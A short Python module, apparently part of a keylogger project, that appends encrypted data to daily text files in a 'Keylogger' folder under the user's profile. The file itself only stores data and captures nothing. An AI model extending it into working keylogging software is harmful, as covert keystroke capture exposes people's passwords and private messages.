import os
from datetime import datetime


class FileWriter:

    def __init__(self,encrypted_data):
        self.encrypted_data = encrypted_data
    
    def writing(self):
        folder_path = os.path.join(os.environ["USERPROFILE"], "Keylogger", "engin", "data_folder")
        current_date = datetime.now().strftime("%Y-%m-%d")
        file_path = os.path.join(folder_path, current_date+".txt")
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        with open(file_path, "a") as txt_file:
            txt_file.write("".join(self.encrypted_data+"\n"))